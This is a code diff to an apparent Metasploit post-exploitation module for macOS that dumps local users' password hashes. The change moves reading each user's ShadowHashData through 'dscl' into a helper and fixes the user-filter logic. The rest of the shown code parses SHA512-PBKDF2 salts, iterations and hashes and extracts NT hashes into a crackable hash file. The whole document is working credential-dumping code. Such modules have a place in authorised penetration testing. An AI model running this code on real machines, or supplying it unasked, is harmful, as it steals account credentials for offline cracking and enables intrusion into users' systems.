@@ -44,43 +44,50 @@ class Metasploit3 < Msf::Post
 
     # build a single hash_file containing all users' hashes
     hash_file = ''
+
+    # iterate over all users
     users.each do |user|
-      next if datastore['MATCHUSER'].blank? or datastore['MATCHUSER'] !~ user
+      next if datastore['MATCHUSER'].present? and datastore['MATCHUSER'] !~ user
       print_status "Attempting to grab shadow for user #{user}..."
       if gt_lion? # 10.8+
-        shadow_bytes = cmd_exec("dscl . read /Users/#{user} dsAttrTypeNative:ShadowHashData").gsub(/\s+/, '')
-        next unless shadow_bytes.start_with? 'dsAttrTypeNative:ShadowHashData:'
-        # strip the other bytes
-        shadow_bytes.sub!(/^dsAttrTypeNative:ShadowHashData:/, '')
+        # pull the shadow from dscl
+        shadow_bytes = grab_shadow_blob(user)
+        next if shadow_bytes.blank?
+
         # on 10.8+ ShadowHashData stores a binary plist inside of the user.plist
-        # SHA512PBKDF2 is used for encrypting.
         # Here we pull out the binary plist bytes and use built-in plutil to convert to xml
         plist_bytes = shadow_bytes.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
+        
         # encode the bytes as \x hex string, print using bash's echo, and pass to plutil
         shadow_plist = cmd_exec("/bin/bash -c 'echo -ne \"#{plist_bytes}\"' | plutil -convert xml1 - -o -")
+        
         # read the plaintext xml
         shadow_xml = REXML::Document.new(shadow_plist)
+        
         # parse out the different parts of sha512pbkdf2
-        dict = sha512 = shadow_xml.elements[1].elements[1].elements[2]
+        dict = shadow_xml.elements[1].elements[1].elements[2]
         entropy = Rex::Text.to_hex(dict.elements[2].text.gsub(/\s+/, '').unpack('m*')[0], '')
         iterations = dict.elements[4].text.gsub(/\s+/, '')
         salt = Rex::Text.to_hex(dict.elements[6].text.gsub(/\s+/, '').unpack('m*')[0], '')
+        
         # PBKDF2 stored in <user, iterations, salt, entropy> format
         decoded_hash = "#{user}:$ml$#{iterations}$#{salt}$#{entropy}"
         print_good "SHA512:#{decoded_hash}"
         hash_file << decoded_hash
       elsif lion? # 10.7
-        # ShadowHashData is stored as plaintext bytes
-        shadow_bytes = cmd_exec("dscl . read /Users/#{user} dsAttrTypeNative:ShadowHashData").gsub(/\s+/, '')
-        next unless shadow_bytes.start_with? 'dsAttrTypeNative:ShadowHashData:'
-        # strip the other bytes
-        shadow_bytes.sub!(/^dsAttrTypeNative:ShadowHashData:/, '')
+        # pull the shadow from dscl
+        shadow_bytes = grab_shadow_blob(user)
+        next if shadow_bytes.blank?
+
         # on 10.7 the ShadowHashData is stored in plaintext
         hash_decoded = shadow_bytes.upcase
+
         # Check if NT HASH is present
         if hash_decoded =~ /4F1010/
           report_nt_hash(hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)[0][0])
         end
+
+        # slice out the sha512 hash + salt
         sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]
         print_status("SHA512:#{user}:#{sha512}")
         hash_file << "#{user}:#{sha512}\n"
@@ -193,6 +200,15 @@ class Metasploit3 < Msf::Post
   # @return [Bool] current user is root
   def root?
     whoami == 'root'
+  end
+
+  # @return [String] containing blob for ShadowHashData in user's plist
+  # @return [nil] if shadow is invalid
+  def grab_shadow_blob(user)
+    shadow_bytes = cmd_exec("dscl . read /Users/#{user} dsAttrTypeNative:ShadowHashData").gsub(/\s+/, '')
+    return nil unless shadow_bytes.start_with? 'dsAttrTypeNative:ShadowHashData:'
+    # strip the other bytes
+    shadow_bytes.sub!(/^dsAttrTypeNative:ShadowHashData:/, '')
   end
 
   # @return [Array<String>] list of user names
